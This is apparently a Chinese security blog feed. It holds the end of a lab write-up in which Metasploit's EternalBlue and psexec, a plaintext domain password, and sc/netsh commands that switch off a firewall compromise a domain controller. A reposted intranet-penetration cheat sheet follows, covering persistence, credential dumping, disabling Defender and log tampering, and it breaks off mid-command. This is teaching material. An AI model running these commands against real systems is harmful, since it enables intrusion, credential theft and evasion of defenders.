18上传ew_for_linux64并利用lcx_slave方式，将攻击机的1235端口与第二层网络Windows 7的999端口连接起来</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">./ew_for_linux64 -s lcx_slave -d <span class="hljs-number">192.168.1.7</span> -e <span class="hljs-number">1235</span> -f <span class="hljs-number">192.168.52.30</span> -g <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure><p>然后配置**&#x2F;etc&#x2F;proxychains.conf**</p><p>使用nmap此93网段进行扫描，发现存在192.168.93.30和192.168.93.40这两台机器，且其445端口都开放，猜测有可能存在永恒之蓝</p><p><img src="/img/domain16.png" alt="domain3"></p><p><img src="/img/domain17.png" alt="domain3"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>对192.168.93.40进行单独扫描，发现其为Windows7且139、135、445端口均开放</p><p>尝试使用msf打永恒之蓝</p><p><strong>注意！直接在msf通过setg Proxies设置全局代理未能成功，而最终通过proxychains来运行msfconsole攻击成功</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.93.40<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/domain18.png" alt="domain3"></p><p>成功拿下</p><h2 id="域控渗透"><a href="#域控渗透" class="headerlink" title="域控渗透"></a>域控渗透</h2><p>使用psexec模块进行对域控的渗透攻击</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.93.30</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 9999</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass Whoami2021</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.93.30</span><br>run<br></code></pre></td></tr></table></figure><p>攻击失败，猜测是防火墙的问题</p><p>重新连接进192.168.52.30的shell，通过其输入用户名和密码来关掉192.168.93.30域控的防火墙</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.93.30</span>\ipc$ <span class="hljs-string">&quot;Whoami2021&quot;</span> /user:<span class="hljs-string">&quot;Administrator&quot;</span><br>sc \\<span class="hljs-number">192.168.93.30</span> create unablefirewall binpath= <span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br>sc \\<span class="hljs-number">192.168.93.30</span> start unablefirewall<br></code></pre></td></tr></table></figure><p><strong>注意！虽然命令执行后会报Failed，但实际防火墙已经关闭了</strong></p><p>再次执行上面的命令，成功拿下了域控</p><p><img src="/img/domain19.png" alt="domain3"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>信息收集</tag>
      
      <tag>横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不同环境下内网渗透的相关技巧</title>
    <link href="/2024/06/17/command1/"/>
    <url>/2024/06/17/command1/</url>
    
    <content type="html"><![CDATA[<p><strong>原文地址：</strong><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">传送门</a></p><h1 id="Windows内网渗透"><a href="#Windows内网渗透" class="headerlink" title="Windows内网渗透"></a>Windows内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>查看主机名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hostname<br></code></pre></td></tr></table></figure><p>查询所有计算机名称：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dsquery computer<br></code></pre></td></tr></table></figure><p>查看配置以及相关补丁信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systeminfo<br><br>wmic qfe get description,installedOn /format:csv<br></code></pre></td></tr></table></figure><p>查看系统版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">var<br></code></pre></td></tr></table></figure><p>查看进程信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">tasklist /svc<br><br>wmic process get caption,executablepath,commandline /format:csv<br><br>get-process  //powershell运行<br></code></pre></td></tr></table></figure><p>查看所有环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">set<br></code></pre></td></tr></table></figure><p>查看计划任务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">schtasks /QUERY /fo LIST /v<br></code></pre></td></tr></table></figure><p>查看安装驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">DRIVERQUERY<br></code></pre></td></tr></table></figure><p>查看操作系统信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic os get osarchitecture //架构<br>wmic os get caption //系统名<br></code></pre></td></tr></table></figure><p>查看逻辑盘：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic logicaldisk get caption<br></code></pre></td></tr></table></figure><p>查看安装的软件信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic product get name,version<br></code></pre></td></tr></table></figure><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>获取当前组的计算机名：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span><br></code></pre></td></tr></table></figure><p>网络发现：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>查看所有域：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p>域信任信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nltest time /domain<br></code></pre></td></tr></table></figure><p>定位域控：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure><p>查看域中的用户名：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>查询域组名称：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group /domain<br></code></pre></td></tr></table></figure><p>查询域管理员：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p>域控信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nltest /dclist:xx<br><br><span class="hljs-keyword">Get</span>-NetDomain<br><br><span class="hljs-keyword">Get</span>-NetDomainController<br><br>net <span class="hljs-keyword">group</span> &quot;Domain controllers&quot;<br></code></pre></td></tr></table></figure><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>查看用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user<br>whoami    whoami /priv    whoami /all<br>wmic useraccount get /ALL /format:csv<br></code></pre></td></tr></table></figure><p>用户特权信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure><p>查看当前权限：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure><p>查看在线用户：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">quser   qwinsta   query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config Workstation<br></code></pre></td></tr></table></figure><p>ACL信息：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">get</span>-acl<br></code></pre></td></tr></table></figure><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p>网卡信息：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure><p>ARP表：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>路由表：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure><p>监听的端口：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>端口信息：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-NetTCPConnection</span><br></code></pre></td></tr></table></figure><p>DNS缓存：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">ipconfig /displaydns<br><br><span class="hljs-built_in">Get</span>-CimInstance -Namespace root/StandardCimv2 -<span class="hljs-built_in">ClassName</span> MSFT_DNSClientCache<br></code></pre></td></tr></table></figure><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>查看防火墙状态：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">netsh advfirewall <span class="hljs-keyword">show</span> allprofiles<br></code></pre></td></tr></table></figure><p>防火墙日志目录：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">netsh firewall <span class="hljs-keyword">show</span> logging<br></code></pre></td></tr></table></figure><p>防火墙规则：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall firewall show <span class="hljs-keyword">rule</span> name=<span class="hljs-literal">all</span><br>netsh firewall show config<br>netsh firewall show <span class="hljs-keyword">state</span><br></code></pre></td></tr></table></figure><h3 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h3><p>无人值守安装文件中的密码信息：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">C:\sysprep.<span class="hljs-literal">inf</span><br>C:\sysprep\sysprep.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattend\Unattended.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>:\Windows\Panther\Unattended.xml<br></code></pre></td></tr></table></figure><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>创建系统隐藏文件：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">attrib</span> +s +a +r +h <span class="hljs-keyword">filename</span> <br><span class="hljs-keyword">attrib</span> +s +h <span class="hljs-keyword">filename</span><br></code></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="sethc"><a href="#sethc" class="headerlink" title="sethc"></a>sethc</h4><p><code>sethc.exe</code> 是 Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 <code>sethc.exe</code> 的方式留下后门，在密码输入页面输入五次shift即可获得权限</p><h4 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h4><p>在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p><p>具体操作为在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code> 下添加项 <code>sethc.exe</code> ，然后在 <code>sethc.exe</code> 这个项中添加 <code>debugger</code> 键，键值为恶意程序的路径</p><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>Windows下有 <code>schtasks</code> 和 <code>at</code> 两种计划任务机制。 其中 <code>at</code> 在较高版本的Windows中已经弃用。</p><p>设置命令为 <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code> 、 <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /sc onstart /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code> 。删除命令为 <code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code></p><h4 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h4><p>Windows可以在用户登录前执行脚本，使用 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 设置。</p><p>也可在 <code>HKCU\Environment\</code> 路径下设置 <code>UserInitMprLogonScript</code> 来实现</p><h4 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h4><p>Windows可以自定义屏幕保护程序，使用 <code>HKEY_CURRENT_USER\Control Panel\Desktop</code> 设置</p><h4 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h4><p>Windows可以使用在用户名后加入 <code>$</code> 来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p><p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看</p><h4 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h4><p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。</p><p>.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门</p><h4 id="Winlogon-Helper-DLL后门"><a href="#Winlogon-Helper-DLL后门" class="headerlink" title="Winlogon Helper DLL后门"></a>Winlogon Helper DLL后门</h4><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p><p>注册表位置如下：</p><ul><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> 用于执行exe程序</li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 用于执行exe程序</li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</code> 用于执行dll文件</li></ul><h2 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h2><h4 id="基于注册表的自启动"><a href="#基于注册表的自启动" class="headerlink" title="基于注册表的自启动"></a>基于注册表的自启动</h4><p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 <code>Run</code> 和 <code>RunOnce</code> ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。</p><p>注册表如下：</p><ul><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></li></ul><p>基于策略的自启动注册表设置如下：</p><ul><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></li></ul><p>设置启动文件夹注册表位置如下：</p><ul><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li><li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li></ul><p>设置服务启动项注册表位置如下：</p><ul><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li><li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li><li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li></ul><p>用户自启动位置 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 、 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> ，其中 <code>Userinit</code> 键允许指定用逗号分隔的多个程序。</p><p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p><ul><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</code></li><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</code></li><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</code></li><li><code>HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></li></ul><h4 id="基于特定目录的自启动"><a href="#基于特定目录的自启动" class="headerlink" title="基于特定目录的自启动"></a>基于特定目录的自启动</h4><p>自启动目录， <code>C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 目录对特定用户生效， <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 对所有用户生效。在NT6以前，两个目录为 <code>C:\Documents and Settings\Username\Start Menu\Programs\StartUp</code> &#x2F; <code>C:\Documents and Settings\All Users\Start Menu\Programs\StartUp</code></p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>UAC (User Account Control) 是Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p><p>当用户登陆Windows时，每个用户都会被授予一个access token，这个token中有security identifier (SID) 的信息，决定了用户的权限</p><h4 id="会触发UAC的操作"><a href="#会触发UAC的操作" class="headerlink" title="会触发UAC的操作"></a>会触发UAC的操作</h4><ul><li>以管理员权限启动应用</li><li>修改系统、UAC设置</li><li>修改没有权限的文件或者目录（ %SystemRoot% &#x2F; %ProgramFiles% 等 ）</li><li>修改ACL (access control list)</li><li>安装驱动</li><li>增删账户，修改账户类型，激活来宾账户</li></ul><h4 id="ByPass"><a href="#ByPass" class="headerlink" title="ByPass"></a>ByPass</h4><ul><li>DLL相关</li><li>进程注入</li><li>注册表</li></ul><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。</p><p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p><h4 id="任意写文件利用"><a href="#任意写文件利用" class="headerlink" title="任意写文件利用"></a>任意写文件利用</h4><p>在Windows中用户可以写的敏感位置主要有以下这些</p><ul><li>用户自身的文件和目录，包括 <code>AppData</code> <code>Temp</code></li><li><code>C:\</code> ，默认情况下用户可以写入</li><li><code>C:\ProgramData</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li><li><code>C:\Windows\Temp</code> 的子目录，默认情况下用户可以创建文件夹、写入文件</li></ul><p>具体的ACL信息可用AccessChk, 或者PowerShell的 <code>Get-Acl</code> 命令查看。</p><p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限</p><h4 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h4><p>MOF是Windows系统的一个文件（ <code>c:/windows/system32/wbem/mof/nullevt.mof</code> ）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p><p>当拥有文件上传的权限但是没有Shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。</p><p>一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户</p><h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>Windows本地密码散列导出工具</p><ul><li>mimikatz</li><li>lsass</li><li>wce</li><li>gsecdump</li><li>copypwd</li><li>Pwdump</li><li>ProcDump</li></ul><p>Windows本地密码破解工具</p><ul><li><p>L0phtCrack</p></li><li><p>SAMInside</p></li><li><p>Ophcrack</p></li><li><p>彩虹表破解</p></li><li><p>本机hash+明文抓取</p></li><li><p>win8+win2012明文抓取</p></li><li><p>ntds.dit的导出+QuarkPwDump读取分析</p></li><li><p>vssown.vbs + libesedb + NtdsXtract</p></li><li><p>ntdsdump</p></li><li><p>利用powershell(DSInternals)分析hash</p></li><li><p>使用 <code>net use \\%computername% /u:%username%</code> 重置密码尝试次数</p></li><li><p>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</p></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>组策略首选项漏洞</li><li>DLL劫持</li><li>替换系统工具，实现后门</li><li>关闭defender<code>Set-MpPreference -disablerealtimeMonitoring $true</code></li></ul><h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>查看日志：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventvwr</span><br></code></pre></td></tr></table></figure><p>伪造日志：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventcreate</span><br></code></pre></td></tr></table></figure><p>操作日志：</p><ul><li>3389登录列表</li><li>文件打开日志</li><li>文件修改日志</li><li>浏览器日志</li><li>系统事件</li><li>程序安装记录</li><li>程序删除记录</li><li>程序更新记录</li></ul><p>登录日志：</p><ul><li>系统安全日志</li></ul><p>日志路径：</p><ul><li>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li><li>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li><li>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li></ul><p>服务日志：</p><ul><li>IIS <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li></ul><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ul><li>AppCompatFlags</li><li>Background Activity Moderator (BAM)</li><li>MuiCache</li><li>RecentApps</li><li>RunMRU</li><li>ShimCache (AppCompatCache)</li></ul><h4 id="注册表键"><a href="#注册表键" class="headerlink" title="注册表键"></a>注册表键</h4><ul><li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h4><p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code>C:\Windows\Prefetch</code></p><h4 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h4><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code>%APPDATA%\Microsoft\Windows\Recent</code></p><h4 id="Amcache-RecentFileCache-bcf"><a href="#Amcache-RecentFileCache-bcf" class="headerlink" title="Amcache &#x2F; RecentFileCache.bcf"></a>Amcache &#x2F; RecentFileCache.bcf</h4><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间</p><p>在Windows 7、Windows Server 2008 R2等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名</p><p>在Windows 8、Windows 10、Windows Server 2012等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\Amcache.hve</code> ，包含文件大小、版本、sha1、二进制文件类型等信息</p><h3 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h3><p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等</p><h3 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h3><ul><li>多次覆写文件 <code>cipher /w:&lt;path&gt;</code></li><li>格式化某磁盘count次 <code>format D: /P:&lt;count&gt;</code></li></ul><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h3><ul><li>SMB弱密码</li><li>SqlServer弱密码</li></ul><h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念</p><p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等</p><h4 id="常见程序"><a href="#常见程序" class="headerlink" title="常见程序"></a>常见程序</h4><p><strong>appsyncvpublishing.exe</strong></p><ul><li>执行powershell</li></ul><p><strong>bitsadmin.exe</strong></p><ul><li>下载文件 <code>bitsadmin /create 1 